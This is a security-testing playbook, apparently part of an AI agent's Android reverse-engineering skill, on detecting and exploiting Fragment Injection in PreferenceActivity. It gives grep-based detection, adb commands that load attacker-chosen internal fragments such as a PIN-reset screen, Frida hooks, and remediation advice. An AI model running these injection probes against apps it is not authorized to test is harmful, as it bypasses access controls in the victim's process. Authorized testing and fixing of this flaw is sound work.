# Android Fragment Injection

Detection and exploitation playbook for the Android **Fragment Injection** vulnerability, invoked from Phase 8 of `SKILL.md`. Use this reference after `scripts/find-fragment-injection.sh` has flagged candidates, and when you need to understand *why* a given probe exists or re-run one manually.

**Only test apps you are authorized to test** (your own apps, signed engagements, or bug-bounty programs that explicitly permit it). The adb and Frida probes below launch the target app with attacker-controlled extras — treat them as active tests, not passive observations.

---

## 1. The vulnerability

`android.preference.PreferenceActivity` (the legacy settings base class) accepts an Intent extra that tells it **which Fragment class to instantiate and display**:

| Constant | Extra key | Purpose |
|---|---|---|
| `EXTRA_SHOW_FRAGMENT` | `:android:show_fragment` | Fully-qualified Fragment class name to load |
| `EXTRA_SHOW_FRAGMENT_ARGUMENTS` | `:android:show_fragment_arguments` | `Bundle` passed to the fragment |
| `EXTRA_SHOW_FRAGMENT_TITLE` | `:android:show_fragment_title` | Title resource/charsequence |
| `EXTRA_NO_HEADERS` | `:android:no_headers` | Skip the header list, jump straight to the fragment |

If an attacker can launch the activity (it is `exported="true"`, or it has an `<intent-filter>` and the app targets SDK < 31, or it is reachable via task affinity / `onNewIntent`), they can supply these extras and force the activity to instantiate **an arbitrary Fragment class that exists in the victim app's classloader** — including private, unexported, or otherwise UI-gated fragments — and run it inside the victim's process and UID.

The framework mitigation added in API 19 (KitKat) is `PreferenceActivity.isValidFragment(String fragmentName)`: before instantiating, the framework asks the activity whether the requested class is allowed. The behavior depends on `targetSdkVersion`:

| `targetSdkVersion` | `isValidFragment` override present? | Behavior |
|---|---|---|
| < 19 | (irrelevant) | Framework **does not call** `isValidFragment` — the extra is honoured unconditionally → **vulnerable** |
| ≥ 19 | missing | Default impl **throws** → app crashes on launch (broken, not exploitable) |
| ≥ 19 | `return true;` unconditionally | **Vulnerable** — any class accepted |
| ≥ 19 | whitelist (e.g. `return ALLOWED.contains(name)`) | Safe |

A parallel, non-`PreferenceActivity` variant exists: any `Activity` that reads an Intent extra and does `Fragment.instantiate(ctx, name, args)`, `Class.forName(name).newInstance()`, or `fragmentManager.instantiate(...)` without validating `name` against a whitelist is equally injectable. `find-fragment-injection.sh` surfaces these as `DYNAMIC_FRAGMENT_LOAD` findings.

### Impact

- **Bypass of access controls / UI gating** — instantiate an internal fragment (e.g. "reset PIN", "export account data", "admin settings") without passing the authentication or navigation that normally guards it.
- **Out-of-context execution** — the fragment runs with the victim app's UID and permissions, but without the activity state/arguments it expects, which can trigger privileged code paths or crash-revealed information.
- **Cross-package instantiation (older platforms)** — on API < 19 a fragment class from *another* installed app could be loaded. Modern classloader isolation confines the attack to the victim app's own classes, which is still serious.
- **Parcelable chaining** — `:android:show_fragment_arguments` is a `Bundle`; on apps that re-parcel it, this can be chained with known `Bundle`/Parcelable deserialization gadgets (the launchAnyWhere / Bundle-mismatch family) for deeper exploitation.

---

## 2. Static detection

Run the detector against the decompiled output:

```bash
bash ${CLAUDE_PLUGIN_ROOT}/skills/android-reverse-engineering/scripts/find-fragment-injection.sh \
  <output>/ --report <output>/fragment-injection-report.md --json <output>/fragment-injection.json
```

Read the machine-readable output:

- `EXPORTED_ACTIVITY=<name>` / `LAUNCHABLE_ACTIVITY=<name>` — activities reachable from outside the app.
- `PREFERENCE_ACTIVITY=<class>` — subclasses of `PreferenceActivity` (the primary attack surface).
- `SHOW_FRAGMENT_READER=<file>:<line>:<snippet>` — code that reads the `:android:show_fragment` / `EXTRA_SHOW_FRAGMENT` extras.
- `IS_VALID_FRAGMENT=<class>:<status>` — `missing`, `always_true` (permissive), or `whitelist` (restrictive).
- `DYNAMIC_FRAGMENT_LOAD=<file>:<line>:<snippet>` — `Fragment.instantiate` / `Class.forName` driven by Intent extras (the non-PreferenceActivity variant).
- `FRAG_INJECTION_CANDIDATE=<class>` — a `PreferenceActivity` that is exported/launchable **and** has a missing or permissive (`always_true`) `isValidFragment` override.
- `CANDIDATE_COUNT=<n>` — exit 0 if > 0, exit 2 if 0.

### Manual confirmation grep

The script is heuristic. Confirm by hand against the decompiled source:

```bash
# PreferenceActivity subclasses
grep -rnE 'extends[[:space:]]+PreferenceActivity|:[[:space:]]*PreferenceActivity\(' <output>/sources/

# Readers of the show_fragment extras (the injection handle)
grep -rnE ':android:show_fragment|EXTRA_SHOW_FRAGMENT' <output>/sources/

# isValidFragment overrides — check the body, not just the signature
grep -rn -A6 'isValidFragment' <output>/sources/

# Generic dynamic fragment instantiation from extras
grep -rnE 'Fragment\.instantiate|FragmentManager.*instantiate|Class\.forName' <output>/sources/ \
  | grep -iE 'extra|intent|bundle|getSerializable|getStringExtra'

# Exported activities in the manifest (jadx-decoded)
awk 'BEGIN{RS="</activity>"} /<activity[[:space:]]/' <output>/resources/AndroidManifest.xml \
  | grep 'android:exported="true"'
```

For each candidate, read the `isValidFragment` body. `return true;` with no conditional = permissive. A comparison against a constant set (`equals`, `contains`, `switch` on the name) = whitelist = safe.

> **"No `PreferenceActivity` found" does NOT mean "safe" for modern apps.** AndroidX apps use `androidx.preference.PreferenceFragmentCompat`, which does not honour `:android:show_fragment` — so the classic vector is absent by design. The detector reports this as `ANDROIDX_PREFERENCE`. For such apps the relevant surface is the **generic dynamic-load variant**: any Activity that instantiates a Fragment from an Intent extra (`DYNAMIC_FRAGMENT_LOAD`). If the detector finds no `PreferenceActivity` candidates but does find `DYNAMIC_FRAGMENT_LOAD` hits, investigate those manually (Section 3's adb technique applies to any activity that reads an extra and instantiates a class, not just `PreferenceActivity`).

---

## 3. Dynamic exploitation (adb)

For each `FRAG_INJECTION_CANDIDATE`, try to instantiate an internal fragment of your choosing. Pick a target fragment that does something interesting — search the decompiled code for `Fragment` subclasses that perform privileged actions:

```bash
grep -rnE 'extends[[:space:]]+(Fragment|DialogFragment|PreferenceFragment)' <output>/sources/
```

Choose a candidate fragment (e.g. `com.example.internal.ResetPinFragment`) and launch the activity with the `:android:show_fragment` extra:

```bash
PACKAGE="<app_package>"
ACTIVITY="<candidate_activity>"          # e.g. com.example.SettingsActivity
FRAGMENT="<target_fragment_fqn>"         # e.g. com.example.internal.ResetPinFragment

# --es  string extra, key is the literal ":android:show_fragment"
# --ez  boolean extra; :android:no_headers=true forces single-pane mode so the
#       fragment is actually attached instead of the header list
adb shell am start -n "${PACKAGE}/${ACTIVITY}" \
  --es ":android:show_fragment" "${FRAGMENT}" \
  --ez ":android:no_headers" true
```

Notes on the `am` invocation:

- The extra key **includes the leading colon** (`:android:show_fragment`). Pass it verbatim — dropping the colon loads nothing.
- Use the fully-qualified fragment class name **as it appears in the app's decompiled source**. The class must be resolvable by the app's classloader (i.e. it ships in the APK). You cannot inject a class from your own attacker app.
- If the activity normally shows a two-pane header list, `--ez :android:no_headers true` is what actually triggers fragment instantiation. Without it the activity may render headers and ignore the fragment extra.
- To pass a `Bundle` of arguments, use `--es :android:show_fragment_arguments` is **not** sufficient (it is a Bundle, not a string). For argument-bundle testing, chain via Frida (Section 4) or craft the intent from a small attacker app. Basic injection does not require arguments.

### Observing the result

Watch logcat for evidence the fragment was instantiated:

```bash
adb logcat -c
adb shell am start -n "${PACKAGE}/${ACTIVITY}" \
  --es ":android:show_fragment" "${FRAGMENT}" --ez ":android:no_headers" true
adb logcat -d | grep -iE 'Fragment|FragmentManager|IllegalState|ClassNotFound|FATAL|inflate|onAttach|onCreateView'
```

Interpretation:

- **Fragment lifecycle logs / the fragment's own `Log.d` tags appear** → injection succeeded; the fragment is running.
- **`IllegalArgumentException: Binary XML file... Error inflating class` / `NullPointerException` in the fragment's `onCreateView`** → the fragment *was instantiated* (injection works) but crashed because it expects a hosting layout/arguments the injected context lacks. This still confirms the vulnerability; a more carefully chosen fragment (or supplied arguments) avoids the crash.
- **`RuntimeException: isValidFragment` / "Fragment not allowed"** → `isValidFragment` rejected the class (whitelist override) — not exploitable via this fragment name. Try other fragment names that may be on the whitelist.
- **Nothing happens / headers shown** → activity ignored the extra. Check `:android:no_headers`, check that the activity actually extends `PreferenceActivity` (not a lookalike), and check `targetSdkVersion` (the platform only honours the fragment extra for the real `PreferenceActivity`).

The skill's crash capture script is useful here for a structured view:

```bash
bash ${CLAUDE_PLUGIN_ROOT}/skills/android-reverse-engineering/scripts/adb-crash-capture.sh \
  -p "${PACKAGE}" -a "${ACTIVITY}" -o ./frag-inj-logs/
```

A crash whose stack trace begins inside the injected fragment's class is positive confirmation.

---

## 4. Runtime confirmation (Frida)

When static + adb results are ambiguous, use Frida to observe the injection handle directly. Generate a script **targeted at the candidate activity** found in Phase 8 (do not use a generic script).

**Hook the candidate subclass, not the base `PreferenceActivity`.** `isValidFragment` is an overridden instance method; setting `implementation` on the base class only intercepts calls that resolve to the base — a subclass override that does not call `super` will never hit it. Use the concrete `FRAG_INJECTION_CANDIDATE` class name:

```javascript
Java.perform(function() {
  // <CANDIDATE> = the FRAG_INJECTION_CANDIDATE class, e.g. com.example.SettingsActivity
  var CANDIDATE = '<CANDIDATE>';
  var activity = Java.use(CANDIDATE);

  // Hook the subclass's own isValidFragment override. Call the original so
  // behavior is preserved while we observe the verdict.
  try {
    activity.isValidFragment.implementation = function(name) {
      console.log('[frag-inj] ' + CANDIDATE + '.isValidFragment asked to allow: ' + name);
      var ret = this.isValidFragment(name);
      console.log('[frag-inj] isValidFragment(' + name + ') -> ' + ret);
      return ret;
    };
  } catch (e) {
    // No override on this subclass. With targetSdk >= 19 the framework throws
    // (broken, not exploitable); with targetSdk < 19 it is never called and the
    // fragment instantiates directly — the instantiate hook below confirms that.
    console.log('[frag-inj] no isValidFragment override on ' + CANDIDATE + ': ' + e);
  }

  // Catch the generic instantiation path used by PreferenceActivity. Use the
  // legacy android.app.Fragment for classic PreferenceActivity targets.
  try {
    var Fragment = Java.use('android.app.Fragment');
    Fragment.instantiate.overload('android.content.Context', 'java.lang.String', 'android.os.Bundle')
      .implementation = function(ctx, fname, args) {
        console.log('[frag-inj] android.app.Fragment.instantiate: ' + fname + ' args=' + args);
        return this.instantiate(ctx, fname, args);
      };
  } catch (e) {
    console.log('[frag-inj] android.app.Fragment not loaded (modern app?): ' + e);
  }
});
```

### AndroidX variant (modern apps)

Modern apps use `androidx.fragment.app.Fragment` and `FragmentFactory`, not the legacy `android.preference.PreferenceActivity` / `android.app.Fragment` path. The classic `:android:show_fragment` vector does **not** apply to `androidx.preference.PreferenceFragmentCompat`; for these apps the relevant surface is any Activity that drives `Fragment.instantiate` / `FragmentFactory.instantiate` / `Class.forName` from an Intent extra (the `DYNAMIC_FRAGMENT_LOAD` findings from the detector). Hook the AndroidX instantiation path instead:

```javascript
Java.perform(function() {
  try {
    var Fragment = Java.use('androidx.fragment.app.Fragment');
    Fragment.instantiate.overload('android.content.Context', 'java.lang.String', 'android.os.Bundle')
      .implementation = function(ctx, fname, args) {
        console.log('[frag-inj] androidx Fragment.instantiate: ' + fname + ' args=' + args);
        return this.instantiate(ctx, fname, args);
      };
  } catch (e) { console.log('[frag-inj] androidx Fragment not present: ' + e); }

  // FragmentFactory.instantiate is the modern replacement used by
  // FragmentContainerView / navigation components.
  try {
    var Factory = Java.use('androidx.fragment.app.FragmentFactory');
    Factory.instantiate.overload('java.lang.ClassLoader', 'java.lang.String')
      .implementation = function(cl, className) {
        console.log('[frag-inj] FragmentFactory.instantiate: ' + className);
        return this.instantiate(cl, className);
      };
  } catch (e) { console.log('[frag-inj] FragmentFactory not present: ' + e); }

  // Fallback: catch reflective loads of fragment-ish classes driven by extras.
  try {
    var Class = Java.use('java.lang.Class');
    Class.forName.overload('java.lang.String', 'boolean', 'java.lang.ClassLoader')
      .implementation = function(name, init, loader) {
        if (name && name.indexOf('Fragment') !== -1) {
          console.log('[frag-inj] Class.forName fragment-ish: ' + name);
        }
        return this.forName(name, init, loader);
      };
  } catch (e) { /* ignore */ }
});
```

### Running it

Run the script while triggering the adb intent from Section 3:

```bash
bash ${CLAUDE_PLUGIN_ROOT}/skills/android-reverse-engineering/scripts/frida-run.sh \
  -p "${PACKAGE}" -l /tmp/frag-inj-trace.js -t 20 --pause
# (from another terminal, or via adb after spawn)
adb shell am start -n "${PACKAGE}/${ACTIVITY}" \
  --es ":android:show_fragment" "${FRAGMENT}" --ez ":android:no_headers" true
```

Use `--pause` (spawn gating) so the hooks are installed before `onCreate`/`isValidFragment` run. Interpret the console output:

- `[frag-inj] <CANDIDATE>.isValidFragment asked to allow: <name>` then `-> true` → the override accepts arbitrary names → **confirmed vulnerable**.
- `isValidFragment` is never called and `Fragment.instantiate` fires with the attacker's class → `targetSdkVersion < 19` legacy path → **confirmed vulnerable**.
- `isValidFragment` returns `false` and `instantiate` is not reached → whitelist rejected this name; try names likely to be whitelisted (look at the whitelist constant in the decompiled `isValidFragment` body).
- `no isValidFragment override` + `targetSdk ≥ 19` → the activity is **broken, not exploitable** (it crashes on injection) — matches the `FRAG_INJECTION_BROKEN` finding from the detector.

To *force* exploitation past a permissive-but-present check, you do not need to bypass anything — `return true` already lets you through. For a whitelist that rejects your name, find an allowed name in the decompiled whitelist and target that fragment instead.

---

## 5. Result classification

| Observation | Verdict |
|---|---|
| Candidate activity + `isValidFragment` `always_true` or missing + adb launches an internal fragment (lifecycle logs or fragment-stack crash) | **Vulnerable** — Fragment Injection confirmed |
| Candidate activity + `targetSdk < 19` + fragment instantiates without `isValidFragment` being called | **Vulnerable** — legacy unvalidated path |
| `DYNAMIC_FRAGMENT_LOAD` + adb extra reaches `Class.forName`/`instantiate` with attacker name | **Vulnerable** — generic fragment injection variant |
| `isValidFragment` whitelist rejects every probed name and the decompiled whitelist contains only expected fragments | **Not vulnerable** (properly mitigated) |
| Activity not exported / not launchable | **Not exploitable** (regardless of `isValidFragment`) |
| `isValidFragment` missing + `targetSdk ≥ 19` → app crashes with `RuntimeException` on injection attempt | Broken but **not exploitable** — report as a robustness/DoS issue, not injection |

Document each finding with: the activity FQN, the fragment name injected, the `isValidFragment` status, the adb command, and the logcat/Frida evidence (stack trace or lifecycle log).

---

## 6. Remediation (for the report)

- **Override `isValidFragment()`** with a strict whitelist — return `true` only for fragment class names the activity legitimately hosts. Never `return true;` unconditionally.
- **Do not export the activity** (`android:exported="false"`) unless another app genuinely needs to launch it.
- **Never instantiate fragments from attacker-controlled extras.** Any `Fragment.instantiate(ctx, name, args)` / `Class.forName(name)` driven by an Intent extra must validate `name` against an allowlist.
- **Migrate to AndroidX `PreferenceFragmentCompat`** which does not use the `:android:show_fragment` extra mechanism, eliminating the classic `PreferenceActivity` surface.
- **Raise `targetSdkVersion` ≥ 19** so the framework enforces the `isValidFragment` gate (legacy apps targeting < 19 skip the check entirely).

---

## 7. References

- Android framework source: `android.preference.PreferenceActivity` — `EXTRA_SHOW_FRAGMENT` constants and `isValidFragment()` default implementation.
- The detector: `scripts/find-fragment-injection.sh` (Phase 8).
- Crash capture helper: `scripts/adb-crash-capture.sh`.
- Frida runner: `scripts/frida-run.sh` (use `--pause` for early hooks).